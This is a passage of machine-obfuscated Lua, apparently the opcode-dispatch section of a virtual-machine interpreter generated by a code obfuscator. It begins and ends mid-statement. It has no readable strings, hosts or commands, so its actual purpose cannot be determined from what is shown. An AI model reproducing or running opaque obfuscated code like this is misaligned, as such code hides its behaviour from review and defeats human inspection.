return;end;end;elseif(J<=42)then if(J<=40)then local A=E[D];H[A](L(H,A+1,E[C]));elseif(J>41)then A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[1][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[3]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<42)then H[E[D]]=(E[C]~=0);A=A+1;end;elseif(J<=43)then H[E[D]]=-(H[E[C]]);elseif(J>44)then A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](H[J+1]);A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<45)then local A=E[D];local l=E[C];local D=50*(E[F]-1);local B=H[A];local E=0;for l=A+1,l do B[D+E+1]=H[A+(l-A)];E=E+1;end;end;elseif(J<=68)then if(J<=56)then if(J<=50)then if(J<=47)then if(J==46)then H[E[D]][B[E[C]]]=H[E[F]];elseif(J<=47)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[2]=H[E[C]];A=A+1;E=l[A];local F=E[D];H[F](H[F+1]);A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];end;elseif(J<=48)then H[E[D]]=H[E[C]][B[E[F]]];elseif(J>49)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[29]];A=A+1;E=l[A];H[E[D]]=H[13][B[E[F]]];A=A+1;E=l[A];H[16]=H[E[C]][B[29]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[7]=H[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[13][B[E[F]]];elseif(J<50)then local l=E[C];local A=H[l];for E=l+1,E[F]do A=A..H[E];end;H[E[D]]=A;end;elseif(J<=53)then if(J<=51)then H[E[D]]=O[E[C]];elseif(J==52)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[11];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<=53)then A=A+1;E=l[A];I[B[E[C]]]=H[E[D]];A=A+1;E=l[A];H[0]=O[E[C]];A=A+1;E=l[A];H[E[D]]=O[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[2]=I[B[20]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[3]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[31]];A=A+1;E=l[A];H[E[D]]=B[61];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[4]=I[B[34]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[61];A=A+1;E=l[A];H[E[D]]=B[9];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[5]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[6]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];local G,N=Y(H[J](L(H,J+1,E[C])));V=N+J-1;local N=0;for A=J,V do N=N+1;H[A]=G[N];end;A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,V));A=A+1;E=l[A];H[E[D]]=H[1]*H[2];A=A+1;E=l[A];H[E[D]][B[20]]=H[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[8]];A=A+1;E=l[A];I[B[27]]=H[E[D]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];end;elseif(J<=54)then H[E[D]]=(not(H[E[C]]));elseif(J>55)then A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[111]];A=A+1;E=l[A];H[E[D]]=B[63];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local C=E[D];local J=H[6];H[C+1]=J;H[C]=J[B[85]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local A=E[D];local D={H[A](L(H,A+1,V));};local l=0;for A=A,E[F]do l=l+1;H[A]=D[l];end;elseif(J<56)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[0][B[4]];end;elseif(J<=62)then if(J<=59)then if(J<=57)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[81]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[8]=I[B[52]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[8][B[49]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[14]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[10]=B[16];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==58)then A=A+1;E=l[A];H[E[D]]();elseif(J<=59)then A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[10][B[31]];A=A+1;E=l[A];H[E[D]]=H[2][B[E[F]]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](H[J+1]);A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[11]=H[E[C]][B[31]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[53];A=A+1;E=l[A];H[E[D]]=B[23];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[10]=H[10]*H[E[F]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[E[F]];A=A+1;E=l[A];H[E[D]]=H[E[C]];end;elseif(J<=60)then A=A+1;E=l[A];H[E[D]][B[58]]=H[E[F]];elseif(J>61)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[0]=(E[C]~=0);A=A+1;E=l[A];I[B[E[C]]]=H[E[D]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[4]];A=A+1;E=l[A];H[E[D]]=R(Z[E[C]],(nil),I);A=A+1;E=l[A];local F=E[D];H[F]=H[F](H[F+1]);A=A+1;E=l[A];H[E[D]]();A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[4]];A=A+1;E=l[A];H[E[D]]=R(Z[E[C]],(nil),I);A=A+1;E=l[A];local D=E[D];H[D]=H[D](H[D+1]);A=A+1;E=l[A];H[0]();elseif(J<62)then A=A+1;E=l[A];H[E[D]]=B[27];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[5]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[5]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[5]=H[5][B[29]];A=A+1;E=l[A];local J=E[D];local V=H[E[C]];H[J+1]=V;H[J]=V[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[2];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local F=E[D];H[F](L(H,F+1,E[C]));A=A+1;E=l[A];H[5]=I[B[33]];A=A+1;E=l[A];H[E[D]]();end;elseif(J<=65)then if(J<=63)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[69]];A=A+1;E=l[A];local F=E[D];local J=H[5];H[F+1]=J;H[F]=J[B[25]];A=A+1;E=l[A];H[E[D]]=B[102];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==64)then local l=E[D];local D={H[l](H[l+1]);};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;elseif(J<=65)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[1]];A=A+1;E=l[A];do return(H[E[D]]);end;end;elseif(J<=66)then A=A+1;E=l[A];H[10]=B[E[C]];A=A+1;E=l[A];H[11]=H[E[C]];A=A+1;E=l[A];local J=E[C];local C=H[J];for A=J+1,E[F]do C=C..H[A];end;H[10]=C;A=A+1;E=l[A];local C=E[D];H[C](H[C+1]);A=A+1;E=l[A];H[E[D]]=I[B[61]];elseif(J==67)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];local F=H[E[C]];H[J+1]=F;H[J]=F[B[6]];A=A+1;E=l[A];H[E[D]]=B[10];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<=68)then H[E[D]]=M(256);end;elseif(J<=80)then if(J<=74)then if(J<=71)then if(J<=69)then A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[8];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[3]];A=A+1;E=l[A];H[5]=B[33];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J>70)then H[E[D]]=I[B[E[C]]];elseif(J<71)then H[E[D]]=H[E[C]]+H[E[F]];end;elseif(J<=72)then A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[2]=B;A=A+1;E=l[A];local D=E[D];H[D](H[D+1]);A=A+1;E=l[A];do return;end;elseif(J==73)then A=A+1;E=l[A];O[E[C]]=H[E[D]];elseif(J<=74)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[0]=O[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[23]];A=A+1;E=l[A];local J=E[D];local F=H[E[C]];H[J+1]=F;H[J]=F[B[82]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));end;elseif(J<=77)then if(J<=75)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[45];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[66]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[6]=I[B[98]];A=A+1;E=l[A];H[E[D]]=H[6][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[30];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[66]];A=A+1;E=l[A];H[E[D]]=H[7][B[69]];A=A+1;E=l[A];H[E[D]][B[56]]=H[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[16];A=A+1;E=l[A];H[10]=B[86];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[5][B[E[C]]]=H[7];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[7]=H[E[C]][B[29]];A=A+1;E=l[A];H[E[D]]=B[86];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[5][B[E[C]]]=H[7];A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[103];A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[102];A=A+1;E=l[A];H[6][B[E[C]]]=B[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];elseif(J==76)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];I[B[20]]=H[E[D]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=I[B[32]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[22]];A=A+1;E=l[A];H[E[D]]=B[24];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local A=E[D];local D={H[A](L(H,A+1,V));};local l=0;for A=A,E[F]do l=l+1;H[A]=D[l];end;elseif(J<=77)then A=A+1;E=l[A];H[E[D]]=B[36];A=A+1;E=l[A];H[E[D]]=I[B[73]];A=A+1;E=l[A];H[E[D]]=I[B[17]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](H[J+1]);A=A+1;E=l[A];local L=E[C];local J=H[L];for A=L+1,E[F]do J=J..H[A];end;H[E[D]]=J;A=A+1;E=l[A];local F=E[D];H[F](H[F+1]);A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[2]();end;elseif(J<=78)then for A=E[D],E[C]do H[A]=(nil);end;elseif(J==79)then A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local I=E[D];local J=H[1];H[I+1]=J;H[I]=J[B[111]];A=A+1;E=l[A];H[E[D]]=B[63];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[1];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;elseif(J<=80)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[0]];A=A+1;E=l[A];H[7]=H[E[C]][B[10]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));end;elseif(J<=86)then if(J<=83)then if(J<=81)then A=A+1;E=l[A];local F=E[D];local C=H[E[C]];H[F+1]=C;H[F]=C[B[22]];A=A+1;E=l[A];local A=E[D];H[A](H[A+1]);elseif(J==82)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[67]];A=A+1;E=l[A];H[8]=B[97];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[9]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[66]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[108]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];local l=E[C];local A=H[l];for E=l+1,E[F]do A=A..H[E];end;H[E[D]]=A;elseif(J<=83)then A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local F=E[D];H[F]=H[F](L(H,F+1,E[C]));A=A+1;E=l[A];H[0]=H[E[C]][B[51]];A=A+1;E=l[A];H[0]=H[0][B[18]];A=A+1;E=l[A];local J=E[D];local F=H[E[C]];H[J+1]=F;H[J]=F[B[32]];A=A+1;E=l[A];H[2]=B[44];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));end;elseif(J<=84)then local A=E[D];H[A]=H[A](L(H,A+1,V));elseif(J==85)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[18]];A=A+1;E=l[A];H[7]=H[E[C]][B[26]];A=A+1;E=l[A];local F=E[D];local J=H[7];H[F+1]=J;H[F]=J[B[9]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<=86)then A=A+1;E=l[A];H[15]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[13][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[29]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));end;elseif(J<=89)then if(J<=87)then A=A+1;E=l[A];local A=E[D];H[A](H[A+1]);elseif(J==88)then local A=E[D];H[A]=H[A]();elseif(J<=89)then A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[11]=I[B[48]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];local D=E[D];H[D](H[D+1]);A=A+1;E=l[A];do return;end;end;elseif(J<=90)then A=A+1;E=l[A];H[1]=I[B[64]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[111]];A=A+1;E=l[A];H[3]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[85]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local A=E[D];local D={H[A](L(H,A+1,V));};local l=0;for A=A,E[F]do l=l+1;H[A]=D[l];end;elseif(J==91)then A=A+1;E=l[A];H[2]();A=A+1;E=l[A];H[E[D]]=(E[C]~=0);A=A+1;E=l[A];I[B[136]]=H[E[D]];A=A+1;E=l[A];H[E[D]]=I[B[379]];A=A+1;E=l[A];H[E[D]]=B[211];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=O[E[C]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];local A=E[D];H[A](H[A+1]);elseif(J<=92)then A=A+1;E=l[A];H[7]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[5]=H[E[C]][B[18]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[11]];A=A+1;E=l[A];local J=E[D];local V=H[E[C]];H[J+1]=V;H[J]=V[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[8];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local F=E[D];H[F](L(H,F+1,E[C]));A=A+1;E=l[A];H[E[D]]=I[B[26]];A=A+1;E=l[A];H[E[D]]();end;elseif(J<=138)then if(J<=115)then if(J<=103)then if(J<=97)then if(J<=94)then if(J>93)then A=A+1;E=l[A];H[3]=M(256);A=A+1;E=l[A];H[E[D]][B[8]]=B[E[F]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[E[F]];A=A+1;E=l[A];H[3][B[16]]=B[E[F]];A=A+1;E=l[A];H[3][B[E[C]]]=B[51];elseif(J<94)then local l=E[D];local B=E[F];local D=l+2;local l=({H[l](H[l+1],H[D]);});for A=1,B do H[D+A]=l[A];end;local l=l[1];if(l)then H[D]=l;A=E[C];else A=A+1;end;end;elseif(J<=95)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local F=E[D];H[F]=H[F](H[F+1]);A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[6]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[11];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==96)then A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[63];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[1];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local A=E[D];local D={H[A](L(H,A+1,V));};local l=0;for A=A,E[F]do l=l+1;H[A]=D[l];end;elseif(J<=97)then H[E[D]]=H[E[C]][H[E[F]]];end;elseif(J<=100)then if(J<=98)then if(H[E[D]]~=B[E[F]])then A=A+1;else A=E[C];end;elseif(J==99)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local D=E[D];H[D]=H[D]();A=A+1;E=l[A];H[0][B[E[C]]]=B[E[F]];elseif(J<=100)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[69]];A=A+1;E=l[A];local J=E[D];local F=H[E[C]];H[J+1]=F;H[J]=F[B[25]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));end;elseif(J<=101)then A=A+1;E=l[A];H[E[D]]=B[4];A=A+1;E=l[A];local J=E[D];H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[0]=O[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==102)then H[E[D]]=H[E[C]]/H[E[F]];elseif(J<=103)then local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;end;elseif(J<=109)then if(J<=106)then if(J<=104)then A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[10]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[15];A=A+1;E=l[A];H[E[D]]=M(256);A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[1];A=A+1;E=l[A];H[E[D]][B[18]]=H[0];A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[E[F]];A=A+1;E=l[A];local D=E[D];H[D](L(H,D+1,E[C]));A=A+1;E=l[A];do return;end;elseif(J>105)then local L=Z[E[C]];local J,B=(nil),({});J=r(({}),({__index=(function(E,A)local A=B[A];return A[1][A[2]];end);__newindex=(function(H,A,E)local A=B[A];A[1][A[2]]=E;end);}));for E=1,E[F],1 do A=A+1;local A=l[A];if(A[P]==18)then B[E-1]=({H,A[C]});else B[E-1]=({O,A[C]});end;Q[#Q+1]=B;end;H[E[D]]=R(L,J,I);elseif(J<106)then A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local F=E[D];H[F]=H[F](L(H,F+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[20]];A=A+1;E=l[A];H[E[D]]=H[6][B[67]];end;elseif(J<=107)then A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[4]=B[15];A=A+1;E=l[A];H[E[D]]=M(256);A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[1];A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[E[F]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[1];A=A+1;E=l[A];local D=E[D];H[D](L(H,D+1,E[C]));A=A+1;E=l[A];do return;end;elseif(J>108)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[0]=I[B[10]];A=A+1;E=l[A];local J=E[D];local I=H[0];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[34];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[27]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[2]=B[4];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<109)then if(H[E[D]]==B[E[F]])then A=A+1;else A=E[C];end;end;elseif(J<=112)then if(J<=110)then H[E[D]]=B[E[C]];elseif(J==111)then A=A+1;E=l[A];H[E[D]]();elseif(J<=112)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[14]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));end;elseif(J<=113)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];H[E[D]]=B[131];A=A+1;E=l[A];local D=E[D];H[D]=H[D](L(H,D+1,E[C]));A=A+1;E=l[A];H[2]=H[1][B[E[F]]];elseif(J>114)then A=A+1;E=l[A];H[E[D]]=I[B[26]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[20]];A=A+1;E=l[A];H[9]=H[9][B[20]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[20]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](H[J+1]);A=A+1;E=l[A];local J=E[C];local C=H[J];for A=J+1,E[F]do C=C..H[A];end;H[E[D]]=C;A=A+1;E=l[A];H[E[D]]=I[B[10]];elseif(J<115)then if(H[E[D]]<=B[E[F]])then A=A+1;else A=E[C];end;end;elseif(J<=126)then if(J<=120)then if(J<=117)then if(J>116)then A=A+1;E=l[A];H[E[D]]=H[8][B[29]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[14]];A=A+1;E=l[A];H[E[D]]=H[16][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[29]];A=A+1;E=l[A];local 